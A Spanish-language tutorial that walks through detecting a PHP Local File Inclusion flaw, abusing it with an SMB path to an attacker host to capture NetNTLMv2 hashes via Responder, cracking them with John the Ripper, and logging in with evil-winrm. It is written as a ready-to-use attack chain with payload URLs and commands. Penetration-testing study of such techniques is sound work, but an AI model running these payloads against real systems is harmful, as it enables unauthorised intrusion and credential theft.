Explotación LFI + SMB y Captura de Hashes NTLMv2
1. Detectar LFI (Local File Inclusion)

Identifica parámetros en la web que incluyan archivos dinámicamente, por ejemplo:

http://target.com/index.php?page=home.html


Prueba incluir archivos locales usando directory traversal (../):

http://target.com/index.php?page=../../../../etc/passwd   (Linux)
http://target.com/index.php?page=../../../../windows/system32/drivers/etc/hosts  (Windows)


Si se muestra el contenido del archivo, la máquina es vulnerable a LFI.

Nota: Puedes probar otros archivos sensibles como config.php (Linux) o C:\Windows\win.ini (Windows) para confirmar.

2. Entender include() en PHP

include() ejecuta el archivo que se le pasa como ruta.

Si el parámetro vulnerable se pasa a include() sin filtrado, puedes controlar qué archivo se incluye.

Esto permite leer archivos arbitrarios o lanzar ataques más avanzados si se combina con otras técnicas (RCE, LFI → RCE).

3. LFI → Captura de hashes NTLMv2 vía SMB

En Windows, puedes forzar al servidor a autenticar hacia tu máquina atacante usando una ruta SMB:

\\IP-ATACANTE\share\archivo


Cuando Windows intenta acceder al recurso, envía un NetNTLMv2 hash con sus credenciales.

Una máquina atacante con un servidor SMB malicioso (por ejemplo Responder) puede capturar estos hashes.

4. Preparar la máquina atacante

Configura Responder en tu máquina atacante:

sudo responder -I <INTERFAZ>


<INTERFAZ>: la interfaz de red que conecta con la víctima (ifconfig para revisar).

Esto levanta un servidor SMB/NBT/LLMNR falso para capturar hashes.

Modifica el parámetro LFI apuntando a tu servidor SMB:

http://target.com/index.php?page=\\IP-ATACANTE\share\archivo


Para URL, usar doble barra si es necesario:

http://target.com/index.php?page=//IP-ATACANTE/share/archivo


Nota: El nombre del share y archivo puede ser cualquiera, no tiene que existir.

5. Resultado esperado

La víctima intenta acceder al recurso SMB → envía un NetNTLMv2 hash.

Responder lo captura automáticamente y lo muestra en pantalla, algo así:

Administrator::VICTIMA:1122334455667788:HASH_NETNTLMv2

6. Guardar y crackear el hash

Copia el hash capturado en un archivo, por ejemplo hashes.txt.

Usa John The Ripper u otra herramienta para crackearlo:

john -w=/usr/share/wordlists/rockyou.txt hashes.txt


John probará passwords del wordlist hasta encontrar la contraseña.

Nota: También puedes usar Hashcat si prefieres GPU.

7. Uso de credenciales obtenidas

Una vez crackeado el hash, obtienes la contraseña de un usuario (ej. Administrator).

Puedes usarla para acceder a servicios remotos habilitados en la víctima:

WinRM → evil-winrm -i <IP> -u <usuario> -p <password>

SMB, RDP o incluso otros servicios si están expuestos.

8. Recomendaciones y buenas prácticas

Este método funciona solo en Windows donde LFI permite rutas SMB.

Nunca dependa de nombres de archivos específicos, mantén la guía general.

Mantén la máquina atacante lista antes de intentar la explotación.

Documenta todo: URL vulnerable, parámetros probados, hash capturado, herramientas usadas.